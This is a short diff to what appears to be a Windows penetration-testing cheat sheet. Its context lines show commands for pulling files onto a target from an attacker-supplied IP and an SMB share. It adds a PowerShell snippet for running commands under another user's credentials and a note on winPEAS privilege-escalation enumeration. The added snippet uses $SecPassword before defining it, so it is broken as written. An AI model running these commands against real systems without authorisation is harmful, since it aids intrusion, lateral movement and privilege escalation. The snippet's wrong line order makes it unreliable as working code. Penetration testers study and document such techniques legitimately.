@@ -336,6 +336,15 @@ dir /a:h `show only hidden files`<br/>
 `powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`
 `smbserver.py Share /opt/share -smb2support , copy file \\IP\Share`
 
+### Executing commands through differnet user 
+
+```powershell
+$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)
+$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
+Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { whoami }
+```
+
+
 ## Enumeration
 
 * Running `winPEAS.exe` on the machine 
